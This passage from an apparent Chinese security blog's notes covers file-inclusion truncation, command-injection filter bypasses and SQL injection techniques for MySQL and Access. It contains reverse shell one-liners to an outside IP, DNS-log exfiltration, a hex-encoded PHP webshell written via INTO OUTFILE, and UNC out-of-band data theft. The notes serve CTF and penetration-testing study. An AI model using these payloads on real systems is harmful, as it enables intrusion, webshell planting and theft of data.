url">？filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././<br></code></pre></td></tr></table></figure></li></ul><h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><ul><li><p>条件：windows OS，点号需要长于256</p></li><li><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">filename=test.txt.........................................<br></code></pre></td></tr></table></figure></li></ul><h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><ul><li>属于伪截断，不受GPC和PHP版本限制（&lt;5.2.8)</li><li>exp <code>?filename=http://127.0.0.1/php.txt?</code></li></ul><h3 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h3><ul><li><code>?filename=http://127.0.0.1/php.txt#</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行-笔记</title>
      <link href="/2022/04/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="php常用命令执行函数"><a href="#php常用命令执行函数" class="headerlink" title="php常用命令执行函数"></a>php常用命令执行函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">`反引号<span class="hljs-comment">//执行无回显</span><br><span class="hljs-title function_ invoke__">system</span>() <span class="hljs-comment">//执行外部程序，并且显示输出</span><br><span class="hljs-title function_ invoke__">exec</span>() <span class="hljs-comment">//执行一个外部程序 返回字符串</span><br><span class="hljs-title function_ invoke__">shell_exec</span>() <span class="hljs-comment">//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</span><br><span class="hljs-title function_ invoke__">passthru</span>() <span class="hljs-comment">//执行外部程序并且显示原始输出</span><br><span class="hljs-title function_ invoke__">pcntl_exec</span>()<span class="hljs-comment">//在当前进程空间执行指定程序</span><br><span class="hljs-title function_ invoke__">popen</span>() <span class="hljs-comment">//打开进程文件指针</span><br><span class="hljs-title function_ invoke__">proc_open</span>() <span class="hljs-comment">//执行一个命令，并且打开用来输入/输出的文件指针</span><br></code></pre></td></tr></table></figure><h2 id="执行时过滤空格"><a href="#执行时过滤空格" class="headerlink" title="执行时过滤空格"></a>执行时过滤空格</h2><ul><li>win:<ul><li>%ProgramFiles:~10,1%</li></ul></li><li>linux: <ul><li>$IFS$9</li><li>{cmd,args}(Bash)</li><li>cat&lt;flag.txt</li><li>${IFS}</li><li>;IFS&#x3D;,;</li><li>${str:0:1}  截取</li></ul></li><li>url编码<ul><li>%09,%0b,%0c,%0a,%0d</li></ul></li></ul><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><ul><li>利用变量拼接：<ul><li>linux:a&#x3D;c;b&#x3D;at;$a​$b flag.php or ${}</li></ul></li><li>利用通配符：* ? </li><li>绕过无数字无字母<ul><li>php7 <ul><li>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。所以很简单了，构造一个可以生成phpinfo这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：  <code>(~%8F%97%8F%96%91%99%90)();</code></li></ul></li><li>shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替</li><li>我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php??????</li></ul></li></ul><ul><li>利用已有字符：<ul><li>expr substr $(awk NR&#x3D;1 1.txt) 2 2</li></ul></li></ul><h2 id="截断符号"><a href="#截断符号" class="headerlink" title="截断符号"></a>截断符号</h2><ul><li>$</li><li>;</li><li>|</li><li>-</li><li>(</li><li>)</li><li>反引号</li><li>||</li><li>&amp;&amp;</li><li>&amp;</li><li>}</li><li>{</li><li>%0a 可以当作空格来用；</li></ul><h2 id="利用base编码绕过："><a href="#利用base编码绕过：" class="headerlink" title="利用base编码绕过："></a>利用base编码绕过：</h2><ul><li>`echo ‘Y2F0Cg&#x3D;&#x3D;’ | base64 -d` 1.txt</li></ul><h2 id="利用php伪协议："><a href="#利用php伪协议：" class="headerlink" title="利用php伪协议："></a>利用php伪协议：</h2><ul><li>c&#x3D;$nice&#x3D;include$_GET[“url”]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.Base64-encode&#x2F;resource&#x3D;flag.php</li></ul><h2 id="打印字符常用命令："><a href="#打印字符常用命令：" class="headerlink" title="打印字符常用命令："></a>打印字符常用命令：</h2><ul><li>cat 由第一行开始显示内容，并将所有内容输出</li><li>tac 从最后一行倒序显示内容，并将所有内容输出</li><li>more 根据窗口大小，一页一页的现实文件内容</li><li>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</li><li>head 只显示头几行</li><li>tail 只显示最后几行</li><li>nl 类似于cat -n，显示时输出行号</li><li>tailf 类似于tail -f  </li><li>sed sed ‘p’ 1.txt</li><li>sort 它将文件进行排序，并将排序结果标准输出</li><li>uniq 用于报告或忽略文件中的重复行</li><li>rev  将文件中的每行内容以字符为单位反序输出</li><li>cut cut -c1- 1.txt</li><li>awk  文本和数据进行处理的编程语言awk ‘{print}’ flag.php</li><li>strings 在对象文件或二进制文件中查找可打印的字符串</li><li>od  输出文件的八进制、十六进制等格式编码的字节 od -c flag.</li><li>paste <strong>paste命令</strong> 用于将多个文件按照列队列进行合并。 可以用来读取文件</li><li>diff  比较给定的两个文件的不同 可以读取数据</li><li>curl file:&#x2F;&#x2F;&#x2F;home&#x2F;xxx.txt 可以读取文件</li><li>bzmore 查看bzip2压缩过的文本文件的内容</li><li>bzless 是增强“.bz2”压缩包查看器，bzless比bzmore命令功能更加强大。</li></ul><h2 id="管道符号："><a href="#管道符号：" class="headerlink" title="管道符号："></a>管道符号：</h2><ul><li>linux:  <ol><li>“ ; “: 执行完前面的语句在执行后面的语句。</li><li>“ | “: 显示后面的语句的执行结果。</li><li>” || “：当前的语句执行出错时，执行后面的语句。</li><li>” &amp; “：两条命令都执行，如果前面语句为假则执行后面的语句，前面的语句    可真可假。</li><li>” &amp;&amp; “：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则执行两条命令，前面的语句只能为真。</li></ol></li><li>win:<ol><li>“ | “ :是直接后面的执行语句</li><li>“ || ” :如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假    才能执行。</li><li>“ &amp; “两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的    语句可真可假。</li><li>“ &amp;&amp; “:如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句    为真则两条命令都执行，前面的语句只能为真。</li></ol></li></ul><h2 id="open-basedir-限制"><a href="#open-basedir-限制" class="headerlink" title="open_basedir 限制"></a>open_basedir 限制</h2><p>&emsp;open_basedir 可将用户访问文件的活动范围限制在指定的区域<br>例如：<br>&emsp;open_basedir&#x3D;&#x2F;tmp&#x2F;:&#x2F;var&#x2F;www&#x2F;html&emsp;代表当前web可访问的文件路径只能为&#x2F;tmp&#x2F;内或者&#x2F;var&#x2F;www&#x2F;html 内的文件可在 php.ini &#x2F; .user.ini 文件配置<br>[?] 使用ini_set方式配置待测试。<br>[?] 是否可以在本地生成一个.user.ini 去替换配置  </p><ul><li>绕过方法：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dh</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>)) &#123;<br><span class="hljs-keyword">while</span> ((<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$dh</span>)) !== <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27; &#x27;</span>;<br>&#125;<br>  <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$dh</span>);<br>&#125;<br><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$f</span>);<br><span class="hljs-comment">//@var_dump(@$f-&gt;getSize());</span><br>    <span class="hljs-comment">//printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">try</span> &#123;<span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<br><span class="hljs-string">&#x27;root&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; &#125;<span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-<br>&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="执行函数禁用"><a href="#执行函数禁用" class="headerlink" title="执行函数禁用"></a>执行函数禁用</h2><h3 id="通过读取文件函数"><a href="#通过读取文件函数" class="headerlink" title="通过读取文件函数"></a>通过读取文件函数</h3><ul><li>file_get_contents()</li><li>highlight_file()</li><li>show_source()</li><li>fgets()</li><li>file()</li><li>readfile()</li></ul><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><ul><li>反弹shell<ul><li><a href="https://xz.aliyun.com/t/2548">反弹shell基础</a></li><li><a href="https://xz.aliyun.com/t/2549">反弹shell</a></li><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</li><li>bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</li><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 &lt;&amp;2</li></ul></li><li>curl外带<ul><li>利用dnslog或者httplog外带数据如：<code>ping `whoami`.xxx.com </code>查看日志</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-不同数据库下的注入方式</title>
      <link href="/2022/04/23/SQL%E6%B3%A8%E5%85%A5-%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/04/23/SQL%E6%B3%A8%E5%85%A5-%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><h3 id="01-MySql-5-0"><a href="#01-MySql-5-0" class="headerlink" title="01. MySql &gt;&#x3D; 5.0"></a>01. MySql &gt;&#x3D; 5.0</h3><h4 id="0x01-获取字段数并确定显示位"><a href="#0x01-获取字段数并确定显示位" class="headerlink" title="0x01 获取字段数并确定显示位"></a>0x01 获取字段数并确定显示位</h4><ul><li>通过order by num （num&#x3D;1,2,3···）当报错时的前一个数就是列数</li></ul><h4 id="0x02-获取系统数据库"><a href="#0x02-获取系统数据库" class="headerlink" title="0x02 获取系统数据库"></a>0x02 获取系统数据库</h4><ul><li><code>select 1,2,schema_name from information_schema.schemata</code></li></ul><h4 id="0x03-获取当前数据库"><a href="#0x03-获取当前数据库" class="headerlink" title="0x03 获取当前数据库"></a>0x03 获取当前数据库</h4><ul><li><code>select 1,2,database()</code></li></ul><h4 id="0x04-获取数据库表"><a href="#0x04-获取数据库表" class="headerlink" title="0x04 获取数据库表"></a>0x04 获取数据库表</h4><ul><li><code>select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema=database()</code></li><li><code>select 1,2,...,table_name from information_schema.tables where table_schema=database() limit 0,1</code></li></ul><h4 id="0x05-获取字段名"><a href="#0x05-获取字段名" class="headerlink" title="0x05 获取字段名"></a>0x05 获取字段名</h4><ul><li><code>select 1,2,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;</code></li></ul><h4 id="0x06-获取数据"><a href="#0x06-获取数据" class="headerlink" title="0x06 获取数据"></a>0x06 获取数据</h4><ul><li><code>select group_concat(字段名,字段名) from (tableName)</code></li></ul><h3 id="02-MySql"><a href="#02-MySql" class="headerlink" title="02. MySql&lt;5.0"></a>02. MySql&lt;5.0</h3><ul><li>MySQL &lt; 5.0 没有信息数据库information_schema，所以只能手工枚举爆破（二分法思想）。 该方式通常用于盲注。</li></ul><h3 id="03-文件导入导出"><a href="#03-文件导入导出" class="headerlink" title="03.文件导入导出"></a>03.文件导入导出</h3><p>Mysql 中读写文件主要是load_file和into outfile 和 into dumpfile, mysql 的导入导出的功能从mysql5版本起都受 系统变量<code>@@secure_file_prev</code> 影响</p><p>查看：<code>show global variables like &#39;%secure%&#39;;</code></p><blockquote><p>如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。 如果变量为空，则不会产生影响，引起不安全的配置。 如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从(MySQL 5.5.53)版本开始允许。</p></blockquote><h4 id="利用into-outfil-dumpfile写文件"><a href="#利用into-outfil-dumpfile写文件" class="headerlink" title="利用into outfil&#x2F;dumpfile写文件"></a>利用into outfil&#x2F;dumpfile写文件</h4><blockquote><p>into outfile 和 into dumpfile的区别 : outfile 写完文件后会在文件后加一个<code>\n</code>换行符，而dumpfile不会</p></blockquote><ul><li>:要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</li><li>:要有file权限，默认情况下只有root有</li><li>:对目录要有写权限，一般image之类的存放突破的目录就有</li></ul><p>如果存在以上条件，还可以注入，那么就可以用into outfile写文件</p><p>例如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/index.php?age=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>x3c3f706870206576616c28245f504f53545b27736b79275d293f3e into outfile ‘H:/wamp64/www/<span class="hljs-number">233</span>.php<br></code></pre></td></tr></table></figure><h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h4><p>1、必须有权限读取并且文件必须完全可读 　</p><p>2、欲读取文件必须在服务器上</p><p>3、必须指定文件完整的路径</p><p>4、欲读取文件必须小于 max_allowed_packet</p><p>如果存在以上条件，还可以注入，那么就可以用load_file()读文件 例如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/index.php?age=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,load_file(‘H:/wamp64/www/<span class="hljs-number">233</span>.php’)<br></code></pre></td></tr></table></figure><p>在mysqld的配置中设置该属性为空</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">secure-file-priv</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><h3 id="OOB注入"><a href="#OOB注入" class="headerlink" title="OOB注入"></a>OOB注入</h3><p>UNC( Universal Naming Convention)&#x2F;通用命名规则 <strong>Windows主机默认存在, Linux主机默认不存在</strong></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">load_file</span>(<span class="hljs-built_in">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,<span class="hljs-built_in">version</span>(),<span class="hljs-string">&#x27;.dd.ceye.io\\a.txt&#x27;</span>));<br><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">load_file</span>(<span class="hljs-built_in">concat</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-string">&#x27;.dd.ceye.io\\a.txt&#x27;</span>));<br></code></pre></td></tr></table></figure><p>当数据过长时或者包含特殊字符时可以采用如下方式</p><blockquote><p><code>select concat(to_ base64(substr(load_ file(&quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\my.ini&quot;),1,15)),&quot;.example.com&quot;) as result;</code> 1.使用<code>load_file()</code>读取文件内容 2.使用<code>substr()</code>对文件内容进行切片 3.使用<code>to_base64()</code> 对切片的内容进行编码 4.使用<code>concat()</code>将编码后的内容与域名进行拼接 5.使用<code>load_file()</code>访问该UNC路径</p></blockquote><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a><strong>无列名注入</strong></h3><p>使用<code>union select</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> c <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> a, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> b, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> `<span class="hljs-number">3</span>` <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin)a limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>无逗号，有<span class="hljs-keyword">join</span>版本<br><span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> `a`)m <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span> `b`)n <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span> `c`)t <span class="hljs-keyword">where</span> <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x;<br></code></pre></td></tr></table></figure><p>盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">((<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;&#123;result+chr(mid)&#125;&#x27;</span>, <span class="hljs-built_in">cast</span>(&quot;0&quot; <span class="hljs-keyword">as</span> JSON)))<span class="hljs-operator">&lt;</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `f1ag_1s_h3r3_hhhhh`))<br></code></pre></td></tr></table></figure><p>要求后面select的结果必须是一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用<code>hex</code>或者<code>binary</code>。 这里只能使用<code>concat</code>将字符型和binary拼接，使之大小写敏感，<code>JSON</code>也可以使用<code>char byte</code>代替</p><h4 id="无select"><a href="#无select" class="headerlink" title="无select"></a><strong>无select</strong></h4><p><code>mysql 8.0.19</code>新增语句<code>table</code> <a href="https://gitee.com/link?target=https://dev.mysql.com/doc/refman/8.0/en/table.html">https://dev.mysql.com/doc/refman/8.0/en/table.html</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">TABLE</span> table_name [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name] [LIMIT number [<span class="hljs-keyword">OFFSET</span> number]]<br></code></pre></td></tr></table></figure><p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p><ul><li><code>table</code>总是显示表的所有列</li><li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。 可以用来盲注表名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;</span><br><span class="hljs-string">(BINARY(&#x27;</span>&#123;&#125;<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure><p>同时代替<code>select</code>被过滤导致只能同表查询的问题</p><p>PS：新增的<code>values</code>语句也挺有意思，在某些情况似乎可以代替<code>union</code>或<code>select</code>进行<code>order by</code>盲注</p><h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><p>Access数据库windows平台下的小型数据库，搭建方便，维护简单，因此一般是与windowns下的iis中间件一起用的</p><h3 id="找注入点并确定数据库类型"><a href="#找注入点并确定数据库类型" class="headerlink" title="找注入点并确定数据库类型"></a>找注入点并确定数据库类型</h3><p>找注入点</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">&#x27;          ● 返回错误<span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>1=1    ● 返回正常<span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>1=2    ● 返回错误<br><span class="hljs-comment"># 满足以上条件即存在注入</span><br></code></pre></td></tr></table></figure><p>判断iis后的数据库类型</p><p>该方法是通过查询其数据特有表来进行判别的 msysobject无访问权限访问必然报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> msysobjects)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> #(报错正常，即无权限)，即可判断其为Access数据库<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> sysobjects)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span>  #(报错正常)，即可判断其为MSSQL数据库<br></code></pre></td></tr></table></figure><h3 id="猜数据库名和字段"><a href="#猜数据库名和字段" class="headerlink" title="猜数据库名和字段"></a>猜数据库名和字段</h3><p><strong>access数据库没有有效办法获取库表名，只能通过暴力破解的方式一个一个的尝试，并且access没有注释</strong></p><p><strong>猜解数据库表名</strong> <strong>access数据库没有库名的概念</strong>，直接就是表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> 表名) <br># 一个一个猜，猜中为止,例如：<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users) <br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> administrator) <br></code></pre></td></tr></table></figure><p><strong>猜字段：</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名)<br># 一个一个猜，猜中为止 例如：<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> administrator)<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> user_name <span class="hljs-keyword">from</span> administrator)<br>http://XXX?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> administrator)<br></code></pre></td></tr></table></figure><h3 id="爆破access中的数据"><a href="#爆破access中的数据" class="headerlink" title="爆破access中的数据"></a>爆破access中的数据</h3><h4 id="猜字段长度和数据（标准）"><a href="#猜字段长度和数据（标准）" class="headerlink" title="猜字段长度和数据（标准）"></a>猜字段长度和数据（标准）</h4><p><strong>猜解字段长度</strong> 通过上述步骤可以知道，数据库表名是“administrator”,表中字段有“user_name”和“password”。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#用返回的对错猜测</span><br><span class="hljs-keyword">and</span> (select top <span class="hljs-number">1</span> <span class="hljs-built_in">len</span>(user_name) <span 